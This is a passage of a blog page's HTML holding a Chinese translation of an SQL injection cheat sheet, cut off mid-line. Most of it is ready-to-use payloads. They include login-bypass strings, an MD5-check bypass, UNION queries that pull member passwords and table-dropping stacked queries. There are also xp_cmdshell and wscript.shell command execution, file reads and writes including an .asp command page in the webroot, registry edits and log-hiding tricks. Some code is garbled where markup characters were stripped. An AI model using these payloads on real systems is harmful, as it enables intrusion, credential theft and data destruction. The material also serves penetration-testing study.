@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="安全,sql," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="SQL注入速查表（cheat sheet）.wiz-todo, .wiz-todo-img {width: 16px; height: 16px; cursor: default; padding: 0 10px 0 2px; vertical-align: -10%;-webkit-user-select: none;} .wiz-todo-label { display: inline-blo">
+<meta name="keywords" content="安全,sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql速查表">
+<meta property="og:url" content="http://www.tenshine.party/2016/03/sql-cheat-sheet/index.html">
+<meta property="og:site_name" content="Tenshine&#39;s Blog">
+<meta property="og:description" content="SQL注入速查表（cheat sheet）.wiz-todo, .wiz-todo-img {width: 16px; height: 16px; cursor: default; padding: 0 10px 0 2px; vertical-align: -10%;-webkit-user-select: none;} .wiz-todo-label { display: inline-blo">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.tenshine.party/2016/03/sql-cheat-sheet/SQL注入速查表（cheat%20sheet）_files/d74e34ff-e528-4102-b95f-acb512912b70.jpg">
+<meta property="og:updated_time" content="2017-10-24T09:48:56.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql速查表">
+<meta name="twitter:description" content="SQL注入速查表（cheat sheet）.wiz-todo, .wiz-todo-img {width: 16px; height: 16px; cursor: default; padding: 0 10px 0 2px; vertical-align: -10%;-webkit-user-select: none;} .wiz-todo-label { display: inline-blo">
+<meta name="twitter:image" content="http://www.tenshine.party/2016/03/sql-cheat-sheet/SQL注入速查表（cheat%20sheet）_files/d74e34ff-e528-4102-b95f-acb512912b70.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.tenshine.party/2016/03/sql-cheat-sheet/"/>
+
+
+
+
+
+  <title>sql速查表 | Tenshine's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tenshine's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.tenshine.party/2016/03/sql-cheat-sheet/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tenshine">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tenshine's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sql速查表</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-03-01T17:23:26+08:00">
+                2016-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/security/" itemprop="url" rel="index">
+                    <span itemprop="name">security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <html><head><br><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=8"><br><title>SQL注入速查表（cheat sheet）</title><style type="text/css" id="wiz_todo_style_id" wiz_link_version="01.00.09">.wiz-todo, .wiz-todo-img {width: 16px; height: 16px; cursor: default; padding: 0 10px 0 2px; vertical-align: -10%;-webkit-user-select: none;} .wiz-todo-label { display: inline-block; padding-top: 7px; padding-bottom: 6px; line-height: 1.5;} .wiz-todo-label-checked {  color: #666;} .wiz-todo-label-unchecked {text-decoration: initial;} .wiz-todo-completed-info {padding-left: 44px; display: inline-block; } .wiz-todo-avatar { width:20px; height: 20px; vertical-align: -20%; margin-right:10px; border-radius: 2px;} .wiz-todo-account, .wiz-todo-dt { color: #666; }</style><br><style type="text/css" id="wiz_custom_css"><br>body<br>{<br>    font-family: 微软雅黑,”Microsoft YaHei”, Georgia,Helvetica,Arial,sans-serif,宋体, PMingLiU,serif;<br>    font-size: 10.5pt;<br>    line-height: 1.5;<br>}<br>html, body<br>{<br><br><br>}<br>h1 {<br>    font-size:1.5em;<br>    font-weight:bold;<br>}<br>h2 {<br>    font-size:1.4em;<br>    font-weight:bold;<br>}<br>h3 {<br>    font-size:1.3em;<br>    font-weight:bold;<br>}<br>h4 {<br>    font-size:1.2em;<br>    font-weight:bold;<br>}<br>h5 {<br>    font-size:1.1em;<br>    font-weight:bold;<br>}<br>h6 {<br>    font-size:1.0em;<br>    font-weight:bold;<br>}<br>img {<br>    border:0;<br>    max-width: 100%;<br>    height: auto !important;<br>}<br>blockquote {<br>    margin-top:0px;<br>    margin-bottom:0px;<br>}<br>table {<br>    border-collapse:collapse;<br>    border:1px solid #bbbbbb;<br>}<br>td {<br>    border-collapse:collapse;<br>    border:1px solid #bbbbbb;<br>}<br></style><br></head><body style=""><h2>关于SQL注入速查表</h2><p>现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。</p><p>样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要</p><ul><li>M:    MySQL</li><li>S: SQL Server</li><li>P:    PostgreSQL</li><li>O:    Oracle</li><li>+: (大概)其他所有数据库</li></ul><p><em>例子</em>：</p><ul><li>(MS) 代表 : MySQL 和 SQL Server 等</li><li>(M<em>S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server</em></li></ul><h2>目录</h2><ol><li>关于SQL注入速查表</li><li>语法参考，攻击样例以及注入小技巧<ol><li>行间注释<ol><li>使用了行间注释的SQL注入攻击样例</li></ol></li><li>行内注释<ol><li>使用了行内注释的注入攻击样例</li><li>MySQL版本探测攻击样例</li></ol></li><li>堆叠查询(Stacking Queries)<ol><li>支持堆叠查询的语言/数据库</li><li>关于MySQL和PHP</li><li>堆叠注入攻击样例</li></ol></li><li>If语句<ol><li>MySQL的If语句</li><li>SQL Server的If语句</li><li>使用了If语句的注入攻击样例</li></ol></li><li>整数(Integers)的使用</li><li>字符串操作<ol><li>字符串的串联</li></ol></li><li>没有引号的字符串<ol><li>使用了16进制的注入攻击样例</li></ol></li><li>字符串异化(Modification)与联系</li><li>Union注入<ol><li>UNION-语言问题处理</li></ol></li><li>绕过登陆界面(SMO+)</li><li>绕过检查MD5哈希的登陆界面<ol><li>绕过MD5哈希检查的例子(MSP)</li></ol></li><li>基于错误(Error Based)-探测字段名<ol><li>使用<code>HAVING</code>来探测字段名(S)</li><li>在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</li></ol></li><li>数据类型、UNION、之类的<ol><li>获取字段类型</li></ol></li><li>简单的注入(MSO+)</li><li>有用的函数、信息收集、内置程序、大量注入笔记<ol><li><code>@@version</code>(MS)</li><li>文件插入(Bulk Insert)(S)</li><li>BCP(S)</li><li>SQL Server的VBS/WSH(S)</li><li>执行系统命令，xp_cmdshell(S)</li><li>SQL Server中的一些特殊的表(S)</li><li>SQL Server的其它内置程序(S)</li><li>大量MSSQL笔记</li><li>使用LIMIT(M)或ORDER(MSO)的注入</li><li>关掉SQL Server(S)</li></ol></li><li>在SQL Server 2005中启用xp_cmdshell</li><li>探测SQL Server数据库的结构(S)<ol><li>获取用户定义表</li><li>获取字段名</li></ol></li><li>移动记录(Moving records)(S)</li><li>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</li><li>盲注<ol><li>关于盲注</li><li>实战中的盲注实例</li></ol></li><li>延时盲注<ol><li><code>WAITFOR DELAY [time]</code>(S)</li><li>实例</li><li><code>BENCHMARK()</code>(M)</li><li>实例</li><li><code>pg_sleep(seconds)</code>(P)</li></ol></li><li>掩盖痕迹<ol><li><code>-sp_password log bypass</code>(S)</li></ol></li><li>注入测试</li><li>一些其他的MySQL笔记<ol><li>MySQL中好用的函数</li></ol></li><li>SQL注入的高级使用<ol><li>强制SQL Server来得到NTLM哈希</li><li>Bulk insert UNC共享文件 (S) </li></ol></li></ol></li><li>待办事项 / 联系方式 / 帮助</li></ol><h2>语法参考，攻击样例以及注入小技巧</h2><h3>行间注释</h3><p><strong>注释掉查询语句的其余部分</strong><br>行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。</p><ul><li><p><code>–</code>(SM)</p><p><code>DROP sampletable;–</code></p></li><li><p><code>#</code>(M)</p><p><code>DROP sampletable;#</code></p></li></ul><h4>使用了行间注释的SQL注入攻击样例</h4><blockquote><p>用户名:<code>admin’–</code></p></blockquote><ul><li>构成语句:<code>SELECT  FROM members WHERE username = ‘admin’–’ AND password = ‘password’</code><br>这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。</li></ul><h3>行内注释</h3><p><strong>通过不关闭注释注释掉查询语句的其余部分</strong>，或者用于<strong>绕过过滤</strong>，移除空格，混淆，或探测数据库版本。</p><ul><li><code>/<em>注释内容</em>/</code>(SM)<ul><li><code>DROP/<em>comment</em>/sampletable</code></li><li><code>DR/<strong>/OP/<em>绕过过滤</em>/sampletable</strong></code></li><li><code>SELECT/<em>替换空格</em>/password//FROM/<strong>/Members</strong></code></li></ul></li><li><p><code>/<em>! MYSQL专属 </em>/</code> (M) </p><p>这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。<br><code>SELECT /<em>!32302 1/0, </em>/ 1 FROM tablename</code></p></li></ul><h4>使用了行内注释的注入攻击样例</h4><blockquote><p>ID:<code>10; DROP TABLE members /<em></em></code></p></blockquote><p>简单地摆脱了处理后续语句的麻烦，同样你可以使用<code>10; DROP TABLE members –</code></p><h4>MySQL版本探测攻击样例</h4><blockquote><p><code>SELECT /!32302 1/0, <em>/ 1 FROM tablename</em></code></p></blockquote><p>如果MySQL的版本高于<strong>3.23.02</strong>，会抛出一个<code>division by 0 error</code></p><blockquote><p>ID:<code>/!32302 10<em>/</em></code></p><p>ID:<code>10</code></p></blockquote><p>如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果</p><h3>堆叠查询(Stacking Queries)</h3><p><strong>一句代码之中执行多个查询语句</strong>，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用</p><ul><li><code>;</code>(S)<br>    <code>SELECT  FROM members; DROP members–</code><br>    结束一个查询并开始一个新的查询</li></ul><h4>支持堆叠查询的语言/数据库</h4><p><strong>绿色：</strong>支持，<strong>暗灰色：</strong>不支持，<strong>浅灰色：</strong>未知<br><img alt="支持堆叠查询的语言/数据库" src="/2016/03/sql-cheat-sheet/SQL注入速查表（cheat sheet）_files/d74e34ff-e528-4102-b95f-acb512912b70.jpg"></p><h4>关于MySQL和PHP</h4><p>阐明一些问题。</p><p><strong>PHP-MySQL不支持堆叠查询</strong>，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？</p><p><em>（译者注：MySQL 5.6.20版本下客户端支持堆叠查询）</em></p><h4>堆叠注入攻击样例</h4><blockquote><p>ID:<code>10;DROP members –</code></p></blockquote><p>构成语句：<code>SELECT <em> FROM products WHERE id = 10; DROP members–</em></code></p><p>这在执行完正常查询之后将会执行DROP查询。</p><h3>If语句</h3><p>根据If语句得到响应。这是<strong>盲注(Blind SQL Injection)的关键之一</strong>，同样也能简单而<strong>准确地</strong>进行一些测试。</p><h4>MySQL的If语句</h4><ul><li><p><code>IF(condition,true-part,false-part)</code>(M)</p><blockquote><p><code>SELECT IF (1=1,’true’,’false’)</code></p></blockquote></li></ul><h4>SQL Server的If语句</h4><ul><li><p><code>IF condition true-part ELSE false-part</code>(S)</p><blockquote><p><code>IF (1=1) SELECT ‘true’ ELSE SELECT ‘false’</code></p></blockquote></li></ul><h4>使用了If语句的注入攻击样例</h4><blockquote><p><code>if ((select user) = ‘sa’ OR (select user) = ‘dbo’) select 1 else select 1/0</code>(S)</p></blockquote><p>如果当前用户不是<strong>“sa”或者”dbo”</strong>,就会抛出一个<strong><code>divide by zero error</code></strong>。</p><h3>整数(Integers)的使用</h3><p>对于绕过十分有用，比如<strong>magic_quotes() 和其他类似过滤器</strong>，甚至是各种WAF。</p><ul><li><p><code>0xHEXNUMBER</code>(SM)</p><p>(HEXNUMBER:16进制数）<br>你能这样使用16进制数：</p><ul><li><p><code>SELECT CHAR(0x66)</code>(S)</p></li><li><p><code>SELECT 0x5045</code>(M) (这不是一个整数，而会是一个16进制字符串）</p></li><li><p><code>SELECT 0x50 + 0x45</code>(M) (现在这是整数了)</p></li></ul></li></ul><h3>字符串操作</h3><p>与字符串相关的操作。这对于构造一个不含有引号，用于绕过或探测数据库都非常的有用。</p><h4>字符串的串联</h4><ul><li><p><code>+</code>(S)</p><p><code>SELECT login + ‘-‘ + password FROM members</code></p></li><li><p><code>||</code> (MO) </p><p><code>SELECT login || ‘-‘ || password FROM members</code></p></li></ul><p><strong><em>关于MySQL的”||”</em></strong><br>这个仅在ANSI模式下的MySQL执行，其他情况下都会当成’逻辑操作符’并返回一个0。更好的做法是使用<code>CONCAT()</code>函数。</p><ul><li><p><code>CONCAT(str1, str2, str3, …)</code>(M)</p><p>连接参数里的所有字符串<br>例：<code>SELECT CONCAT(login, password) FROM members</code></p></li></ul><h3>没有引号的字符串</h3><p>有很多使用字符串的方法，但是这几个方法是一直可用的。使用<code>CHAR()</code>(MS)和<code>CONCAT()</code>(M)来生成没有引号的字符串</p><ul><li><p><code>0x457578</code> (M) - 16进制编码的字符串</p><p><code>SELECT 0x457578</code></p><p>这在MySQL中会被当做字符串处理</p></li><li><p>在MySQL中使用16进制字符串的一个简单方式：<br><code>SELECT CONCAT(‘0x’,HEX(‘c:\boot.ini’))</code></p></li><li><p>在MySQL中使用<code>CONCAT()</code>函数：<br><code>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))</code> (M) </p><p>这会返回’KLM’</p></li><li><p><code>SELECT CHAR(75)+CHAR(76)+CHAR(77)</code> (S) </p><p>这会返回’KLM’</p></li></ul><h4>使用了16进制的注入攻击样例</h4><ul><li><p><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69)</code> (M) </p><p>这会显示<strong>c:\boot.ini</strong>的内容</p></li></ul><h3>字符串异化(Modification)与联系</h3><ul><li><p><code>ASCII()</code> (SMP) </p><p>返回最左边字符的ASCII码的值。这是一个用于盲注的重要函数。</p><p>例：<code>SELECT ASCII(‘a’)</code></p></li><li><p><code>CHAR()</code> (SM) </p><p>把整数转换为对应ASCII码的字符</p><p>例：<code>SELECT CHAR(64)</code></p></li></ul><h3>Union注入</h3><p>通过union你能跨表执行查询。最简单的，你能注入一个查询使得它返回另一个表的内容。<br><code>SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members</code></p><p>这会把news表和members表的内容合并返回。</p><p>另一个例子：<br><code>‘ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–</code></p><h4>UNION-语言问题处理</h4><p>当你使用Union来注入的时候，经常会遇到一些错误，这是由于不同的语言的设置（表的设置、字段设置、表或数据库的设置等等）。这些办法对于解决那些问题都挺有用的，尤其是当你处理日文，俄文，土耳其文的时候你会就会见到他们的。</p><ul><li><p>使用 <code>COLLATE SQL_Latin1_General_Cp1254_CS_AS</code>(S)</p><p>或者其它的什么语句，具体的自己去查SQL Server的文档。<br>例：<code>SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members</code></p></li><li><p><code>Hex()</code>(M)</p><p>百试百灵~</p></li></ul><h3>绕过登陆界面(SMO+)</h3><p><em>SQL注入101式</em>(大概是原文名字吧？),登陆小技巧</p><ul><li><code>admin’ –</code></li><li><code>admin’ #</code></li><li><code>admin’/</code></li><li><code>‘ or 1=1–</code></li><li><code>‘ or 1=1#</code></li><li><code>‘ or 1=1/<em></em></code></li><li><code>‘) or ‘1’=’1–</code></li><li><code>‘) or (‘1’=’1–</code></li><li>….</li><li>以不同的用户登陆 (SM)<br>    <code>‘ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–</code></li></ul><p>*<em>旧版本的MySQL不支持union</em></p><h3>绕过检查MD5哈希的登陆界面</h3><p>如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。</p><h4>绕过MD5哈希检查的例子(MSP)</h4><blockquote><p>用户名：<code>admin</code></p><p>密码：<code>1234 ‘ AND 1=0 UNION ALL SELECT ‘admin’,’81dc9bdb52d04dc20036dbd8313ed055</code></p></blockquote><p>其中<code>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</code></p><h3>基于错误(Error Based)-探测字段名</h3><h4>使用<code>HAVING</code>来探测字段名(S)</h4><ul><li><code>‘ HAVING 1=1 –</code></li><li><code>‘ GROUP BY table.columnfromerror1 HAVING 1=1 –</code></li><li><code>‘ GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 –</code></li><li>……</li><li><code>‘ GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 –</code></li><li>直到它不再报错，就算搞定了</li></ul><h4>在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</h4><p>通过ORDER BY来探测字段数能够加快union注入的速度。</p><ul><li><code>ORDER BY 1–</code></li><li><code>ORDER BY 2–</code></li><li>……</li><li><code>ORDER BY N–</code> </li><li>一直到它报错为止，最后一个成功的数字就是字段数。</li></ul><h3>数据类型、UNION、之类的</h3><p><strong>提示：</strong></p><ul><li>经常给<strong>UNION</strong>配上<strong>ALL</strong>使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)</li><li>如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用<code>-1</code>或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。</li><li>在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强<ul><li>盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）</li></ul></li></ul><h4>获取字段类型</h4><ul><li><p><code>‘ union select sum(columntofind) from users–</code> (S) </p><pre><code>Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’<br>[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar<em>* data type as an argument.<br></em></code></pre><p>如果没有返回错误说明字段是<strong>数字类型</strong><br>+ 同样的，你可以使用<code>CAST()</code>和<code>CONVERT()</code><br>+   <code>SELECT  FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL–</code><br>+ <code>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-</code></p><p>没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。<br>+ <code>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-</code></p><p>没报错 – 第一个字段是<code>integer</code>类型。<br>+ <code>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 –</code></p><p>报错 – 第二个字段不是<code>integer</code>类型</p></li><li><p><code>11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-</code></p><p>没报错 – 第二个字段是<code>string</code>类型。</p></li><li><p><code>11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-</code></p><p>报错 – 第三个字段不是<code>integer</code> </p></li><li><p>……</p><pre><code>Microsoft OLE DB Provider for SQL Server error ‘80040e07’<br>Explicit conversion from data type int to image is not allowed.<br></code></pre></li></ul><p><strong>你在遇到union错误之前会先遇到convert()错误</strong>，所以先使用convert()再用union</p><h3>简单的注入(MSO+)</h3><p><code>‘; insert into users values( 1, ‘hax0r’, ‘coolpass’, 9 )/<em></em></code></p><h3>有用的函数、信息收集、内置程序、大量注入笔记</h3><h4><code>@@version</code>(MS)</h4><p>数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。</p><p><code>INSERT INTO members(id, user, pass) VALUES(1, ‘’+SUBSTRING(@@version,1,10) ,10)</code></p><h4>文件插入(Bulk Insert)(S)</h4><p>把文件内容插入到表中。如果你不知道应用目录你可以去<strong>读取IIS metabase file</strong>(<em>仅IIS 6</em>)(<em>%systemroot%\system32\inetsrv\MetaBase.xml</em>)然后在里面找到应用目录。</p><ol><li>新建一个表foo(<code>line varchar(8000)</code>)</li><li><code>BULK INSERT foo FROM ‘c:\inetpub\wwwroot\login.asp’</code></li><li>DROP了临时表，重复另一个文件</li></ol><h4>BCP(S)</h4><p>写入文件。这个功能需要登录<br><code>bcp “SELECT  FROM test..foo” queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</code></p><h4>SQL Server的VBS/WSH(S)</h4><p>由于ActiveX的支持，你能在SQL Server中使用VBS/WSH</p><pre><code>declare @o int<br>exec sp_oacreate ‘wscript.shell’, @o out<br>exec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’<br></code></pre><blockquote><p>Username: <code>‘; declare @o int exec sp_oacreate ‘wscript.shell’, @o out exec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’ –</code></p></blockquote><h4>执行系统命令，xp_cmdshell(S)</h4><p>众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限</p><p><code>EXEC master.dbo.xp_cmdshell ‘cmd.exe dir c:’</code></p><p>用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。</p><p><code>EXEC master.dbo.xp_cmdshell ‘ping ‘</code></p><p>如果有错误，或者union或者其他的什么，你都不能直接读到结果。</p><h4>SQL Server中的一些特殊的表(S)</h4><ul><li><p>Error Messages</p><p><code>master..sysmessages</code><br>+ Linked Servers </p><p><code>master..sysservers</code></p></li><li><p>Password (2000和2005版本的都能被破解，这俩的加密算法很相似) </p><p>SQL Server 2000: masters..sysxlogins </p><p>SQL Server 2005 : sys.sql_logins </p></li></ul><h4>SQL Server的其它内置程序(S)</h4><ol><li><p>命令执行 (xp_cmdshell) </p><p><code>exec master..xp_cmdshell ‘dir’</code></p></li><li><p>注册表操作 (xp_regread)</p><ol><li>xp_regaddmultistring</li><li>xp_regdeletekey</li><li>xp_regdeletevalue</li><li>xp_regenumkeys</li><li>xp_regenumvalues</li><li>xp_regread</li><li>xp_regremovemultistring</li><li>xp_regwrite <pre><code>exec xp_regread HKEY_LOCAL_MACHINE, ‘SYSTEM\CurrentControlSet       \Services\lanmanserver\parameters’, ‘nullsessionshares’<br>exec xp_regenumvalues HKEY_LOCAL_MACHINE, ‘SYSTEM       \CurrentControlSet  \Services\snmp\parameters\validcommunities’<br></code></pre></li></ol></li><li><p>管理服务(xp_servicecontrol)</p></li><li>媒体(xp_availablemedia)</li><li>ODBC 资源 (xp_enumdsn)</li><li>登录 (xp_loginconfig)</li><li>创建Cab文件 (xp_makecab)</li><li>域名列举 (xp_ntsec_enumdomains)</li><li>杀进程 (need PID) (xp_terminate_process)</li><li><p>新建进程 (<em>实际上你想干嘛都行</em>) </p><pre><code>sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’<br>exec xp_webserver<br></code></pre></li><li><p>写文件进UNC或者内部路径 (sp_makewebtask)</p></li></ol><h4>大量MSSQL笔记</h4><p><code>SELECT <em> FROM master..sysprocesses /</em>WHERE spid=@@SPID<em>/</em></code></p><p><code>DECLARE @result int; EXEC @result = xp_cmdshell ‘dir .exe’;IF (@result = 0) SELECT 0 ELSE SELECT 1/0</code></p><p>HOST_NAME()<br>IS_MEMBER (Transact-SQL)<br><br>IS_SRVROLEMEMBER (Transact-SQL)<br><br>OPENDATASOURCE (Transact-SQL)</p><p><code>INSERT tbl EXEC master..xp_cmdshell OSQL /Q”DBCC 